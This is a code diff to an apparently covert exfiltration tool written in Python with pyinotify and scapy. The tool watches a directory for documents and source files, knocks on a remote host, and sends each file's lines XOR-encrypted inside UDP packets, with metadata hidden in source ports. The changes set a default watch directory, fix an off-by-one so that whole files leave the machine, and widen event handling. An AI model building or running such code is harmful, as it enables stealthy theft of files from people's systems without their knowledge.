@@ -52,7 +52,7 @@ CHANNEL = 80
 SEND_PORT = 443
 
 # File watching variables
-WATCH_DIR = None                                    # Make WATCH_DIR None if not using a default watch
+WATCH_DIR = '/temp'                                   # Make WATCH_DIR None if not using a default watch
 MASK = pyinotify.IN_MODIFY | pyinotify.IN_CREATE | pyinotify.IN_DELETE
 EXTENSIONS = '.pdf,.docx,.doc,.txt,.rb,.py'
 
@@ -374,12 +374,12 @@ class EventHandler(pyinotify.ProcessEvent):
         # Get number of lines to send
         f = open(event.pathname, 'r')
         lines = f.readlines()
-
+        print 'LINES:', len(lines)
         # Send length of response
         send(IP(dst=default_dest) / UDP(sport=len(lines), dport=SEND_PORT), verbose=0)
 
         # Send data
-        for i in range(0, len(lines) - 1):
+        for i in range(0, len(lines)):
             try:
                 send(IP(dst=default_dest) / UDP(sport=4444, dport=SEND_PORT) / xor_crypt(lines[i]), verbose=0)
                 print 'Sent: ' + lines[i]
@@ -387,7 +387,7 @@ class EventHandler(pyinotify.ProcessEvent):
                 print ex.message
 
     def process_IN_DELETE(self, event):
-        if all(not event.pathname.endswith(ext) for ext in self.extensions):
+        if all(not event.pathname.endswith(ext) for ext in self.extensions) and not os.path.isdir(event.pathname):
             return
 
         knock(default_dest)
@@ -395,7 +395,7 @@ class EventHandler(pyinotify.ProcessEvent):
         send(IP(dst=default_dest) / UDP(sport=4444, dport=SEND_PORT) / xor_crypt('{0} was deleted'.format(event.pathname)), verbose=0)
 
     def process_IN_CREATE(self, event):
-        if all(not event.pathname.endswith(ext) for ext in self.extensions):
+        if all(not event.pathname.endswith(ext) for ext in self.extensions) and not os.path.isdir(event.pathname):
             return
         knock(default_dest)
         send(IP(dst=default_dest) / UDP(sport=1, dport=SEND_PORT), verbose=0)
